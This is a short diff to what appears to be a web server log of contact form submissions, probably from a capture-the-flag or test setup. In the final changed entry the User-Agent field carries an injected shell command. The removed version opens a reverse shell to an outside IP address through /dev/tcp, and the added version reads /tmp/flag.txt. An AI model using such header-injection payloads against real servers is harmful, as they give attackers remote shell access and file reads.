@@ -59,4 +59,4 @@
 [2025-04-05 19:15:47] Contact form submission from Dorothy Wilson (dorothy@example.com) - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
 [2025-04-05 20:30:28] ERROR: NextJS static optimization failed - Contact form component dynamic import error
 [2025-04-06 08:45:13] Contact form submission from Paul Davis (paul@example.com) - User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
-[2025-04-06 09:30:44] ERROR: Contact form submission from Sharon Johnson (sharon@example.com) - User-Agent: $(sh -i >& /dev/tcp/172.29.218.150/9000 0>&1)
+[2025-04-06 09:30:44] ERROR: Contact form submission from Sharon Johnson (sharon@example.com) - User-Agent: Mozilla/5.0 $(cat /tmp/flag.txt)
